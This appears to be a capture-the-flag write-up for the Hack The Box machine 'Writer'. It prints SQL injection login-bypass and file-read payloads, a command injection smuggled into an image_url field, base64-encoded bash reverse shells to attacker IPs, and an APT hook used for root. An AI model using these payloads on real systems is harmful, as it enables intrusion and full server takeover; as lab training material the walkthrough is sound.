# Enumration

#### Nmap Scan

```text
┌──(kali㉿kali)-[~/Documents/Writer]
└─$ nmap -p 22,80,139,445 -A 10.10.11.101
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-11 16:30 IST
Nmap scan report for 10.10.11.101
Host is up (0.19s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>   
```


#### Dir Fuzzing (FFUF SCAN)


```text
FFUF SCAN

static                  [Status: 301, Size: 309, Words: 20, Lines: 10]
logout                  [Status: 302, Size: 208, Words: 21, Lines: 4]
dashboard               [Status: 302, Size: 208, Words: 21, Lines: 4]
administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35]
```

***

#### LOGIN PAGE

##### SQL-INJECTION

##### ❄️ Bypass Login-Page
```text
admin' or '1'='1`
```


##### ⚡ Enumrating Files 


|Enumrating |Payload | Result|
|--------------------|---------|----------------|
|DataBase version | `' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL-- -` | 0.3.29-MariaDB-0ubuntu0.20.04.1 |
| DataBase Name | `' UNION ALL SELECT NULL,database(),NULL,NULL,NULL,NULL-- -` | Writer |
| Database User | `' UNION ALL SELECT NULL,user(),NULL,NULL,NULL,NULL-- -` | admin@localhost |


---

# 🔓Foothold

#### Reading some Files
Payload :
```text
' UNION ALL SELECT NULL,LOAD_FILE("/etc/apache2/sites-available/000-default.conf"),NULL,NULL,NULL,NULL-- -
```

file :

```text
&lt;VirtualHost *:80&gt;
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi

<SNIP>

# Listen 8080
#&lt;VirtualHost 127.0.0.1:8080&gt;
#	ServerName dev.writer.htb
#	ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
#	Alias /static /var/www/writer2_project/static
<SNIP>
```

-  ##### Reading `writer.wsgi` file
\
**writer.wsgi** 
```python
<SNIP>
# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get(&#34;SECRET_KEY&#34;, &#34;&#34;)
```

\
** Reading `__init__.py`**

Payload :
```text
' UNION ALL SELECT NULL,LOAD_FILE("/var/www/writer.htb/writer/__init__.py"),NULL,NULL,NULL,NULL-- -
```
\
Potential Code from **`__init__.py`**

```python
if request.form.get(image_url):
	image_url = request.form.get(image_url)
    if '.jpg' in image_url:
    	try:
			local_filename, headers = urllib.request.urlretrieve(image_url)
			os.system('mv {} {}.jpg'.format(local_filename, local_filename))
```

> We can exploit the `os.system` by passing localfile name under `image_url` in our Request while uploading the Image with appropriate name to get a `reverse shell`

```text
file:///var/www/writer.htb/writer/static/img/ftest2.jpg;`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NC85MDAxIDA+JjEK | base64 -d | bash`;#
```
Passing it under `image_url` in burp after uploading the image

---

# User

Reading `settings.py` under `writer2_project` Directory
pointed to `/etc/mysql/my.cnf`

```text
database = dev
user = djangouser
password = DjangoSuperPassword
```

##### Getting Hashed Password 
```shell
ww-data@writer:/var/www/writer2_project$ mysql -u djangouser -h 127.0.0.1 -p dev
<r2_project$ mysql -u djangouser -h 127.0.0.1 -p dev
Enter password: DjangoSuperPassword
select * from auth_user;
exit          
id      password        last_login      is_superuser    username        first_name      last_name       email   is_staff        is_active       date_joined
1       pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=        NULL    1       kyle                    kyle@writer.htb 1       1       2021-05-19 12:41:37.168368
```

After cracking with `john`

- **kyle:marcoantonio**

And We can `ssh` into machine using user `kyle`

---
# User 2

User Kyle belongs to group `filter`  On searching files available for group `filter` Found `/etc/postfix/disclaimer`

Moreover Port `25` is Listing which is `SMPT` 

Reference : [Viperone | Linux postfish](https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish)

Got a reverse shell as john and reading it's `id_rsa` file to use ssh.

---

# Privilage Escalation
Logged in as `JOHN` using `SSH`

```shell
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
john@writer:~/.otherplyeronWriter$ find / -group management 2>/dev/null
/etc/apt/apt.conf.d
```

Creating **nano 1000-pwned** to get Rev-Shell when it get executed
```text
APT::Update::Pre-Invoke {"echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44Mi85MDAyIDA+JjEK | base64 -d | bash"; };
```

